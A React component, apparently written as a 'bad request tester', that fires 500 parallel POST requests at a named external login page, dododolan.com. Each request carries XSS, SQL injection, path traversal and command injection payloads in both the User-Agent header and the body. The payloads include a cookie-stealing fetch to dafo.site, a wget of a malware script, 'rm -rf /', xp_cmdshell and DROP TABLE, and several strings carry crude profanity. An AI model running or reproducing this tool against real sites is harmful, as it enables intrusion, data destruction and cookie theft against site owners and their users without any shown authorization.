import React from "react";

const BadRequestTester: React.FC = () => {
  const payloads = [
    "<script>alert('dafo')</script>",
    "<img src=x onerror=alert('gajelas memek ngentot')>",
    "<svg/onload=alert(`ngapain bro`)>",
    "<marquee onstart=alert('dafo kontol')>",
    "<input onfocus=alert('bocorrr') autofocus>",
    "<video><source onerror=alert('kena')></video>",
    "<a href='javascript:alert(`klik apa sih kontol`)'></a>",
    "<details open ontoggle=alert('dafo toggle')>",
    "<iframe src='javascript:confirm(`ini iframe`)'></iframe>",
    "<object data='javascript:prompt(`halo dari dafo`)'></object>",
    "<scr<script>ipt>alert('rusak')</scr</script>ipt>",
    "<scr<script src='//xss.dafo/evil.js'></scr<script>>",
    "<svg><desc><![CDATA[</desc><script>alert('blur')</script>]]></svg>",
    "<math href='javascript:alert(999)'></math>",
    "<button formaction='javascript:alert(`form rusak`)'>🔥</button>",
    "' OR 'dafo'='dafo",
    "'; DROP TABLE pengunjung;--",
    "' UNION SELECT null, version(), user(); --",
    "' OR sleep(5)#",
    "' OR 1=1-- gajelas",
    "'; exec xp_cmdshell('whoami'); --",
    "' || alert('gagal filter bro') || '",
    "../../../../dafo.txt",
    "..\\..\\..\\gajelas\\config.yml",
    "/etc/shadow?dafo=true",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "`curl dafo.site`",
    "| ping -n 5 127.0.0.1 |",
    "$(echo dafo)",
    "& rm -rf / --no-preserve-root",
    "; wget http://dafo.site/malware.sh",
    "|| alert('kena inject')",
    "<script>fetch('http://dafo.site/leak?cookie=' + document.cookie)</script>",
    "<svg><g onload=alert(`🚨 dafo xss`)>",
    "<img src=x:alert(1) onerror=eval(atob('YWxlcnQoJ2RhbW4nKQ=='))>",
    "<div style=animation-name:rot; onanimationstart=alert('dafoCSS')>",
    "<style>*{background:url('javascript:alert(\"dafo\")')}</style>",
  ];

  const sendPayload = async (startIndex: number, count: number, thread: number) => {
    for (let i = 0; i < count; i++) {
      const index = startIndex + i;
      const payload = payloads[index % payloads.length];

      try {
        const res = await fetch("https://dododolan.com/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "User-Agent": payload,
          },
          body: JSON.stringify({
            nama: `Dafo-${thread}-${index}`,
            pesan: payload,
          }),
        });

        if (res.status === 403) {
          console.warn(`🛑 [${index}] DIBLOKIR (403): Pola mencurigakan`);
        } else if (res.status === 429) {
          console.warn(`❌ [${index}] RATE LIMIT`);
        } else {
          console.log(`✅ [${index}] Status: ${res.status}`);
        }
      } catch (err) {
        console.error(`🔥 [${index}] Gagal:`, err);
      }
    }
  };

  const handleBadRequestTest = async () => {
    const totalRequests = 500;
    const threads = 5;
    const perThread = totalRequests / threads;

    const promises = Array.from({ length: threads }).map((_, tIndex) =>
      sendPayload(tIndex * perThread, perThread, tIndex + 1)
    );

    await Promise.all(promises);
    console.log("✅ Semua request selesai dikirim.");
  };

  return (
    <div className="p-4">
      <button
        onClick={handleBadRequestTest}
        className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition"
      >
        Kirim 500 Payload 💣 (10 Paralel)
      </button>
    </div>
  );
};

export default BadRequestTester;
